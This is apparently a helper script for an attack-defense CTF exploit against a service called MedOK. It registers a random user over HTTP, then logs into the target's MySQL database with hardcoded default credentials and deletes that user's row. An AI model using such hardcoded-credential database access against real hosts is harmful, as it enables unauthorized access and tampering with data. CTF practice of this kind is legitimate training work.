# Sploit Helper for MedOK
# Author: boomgarang

import os
import aiohttp
import pymysql
from colorama import Fore, Style

# DB_HOST = 'localhost'
DB_USER = 'admin'
DB_PASSWORD = 'xxXX2244'
DB_NAME = 'app'

async def register_user(HOST, PORT):
    username = f"user_" + os.urandom(10).hex()
    email = f"{username}@test.com"
    async with aiohttp.ClientSession() as session:
        data = {
            "name": username,
            "email": email,
            "password": "password123"
        }
        async with session.post(f'http://{HOST}:{PORT}/register', data=data) as resp:
            if resp.status in [200, 302]:
                cookies = resp.cookies
                print(Fore.GREEN + f"[+] Sploit (Medok): {HOST} - User registered successfully" + Style.RESET_ALL)
                return 101, (email, cookies)
            else:
                print(Fore.RED + f"[-] Sploit (Medok): {HOST} - Registration failed" + Style.RESET_ALL)
                return 102, None

async def delete_user_from_db(email, HOST):
    try:
        connection = pymysql.connect(
            host=HOST,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_NAME,
            cursorclass=pymysql.cursors.DictCursor
        )
        with connection.cursor() as cursor:
            cursor.execute("DELETE FROM users WHERE email = %s", (email,))
            connection.commit()
        connection.close()
        print(Fore.GREEN + f"[+] Sploit (Medok): {HOST} - User deleted from database" + Style.RESET_ALL)
        return 101, None
    except Exception as e:
        print(Fore.RED + f"[-] Sploit (Medok): {HOST} - Error deleting user: {e}" + Style.RESET_ALL)
        return 102, None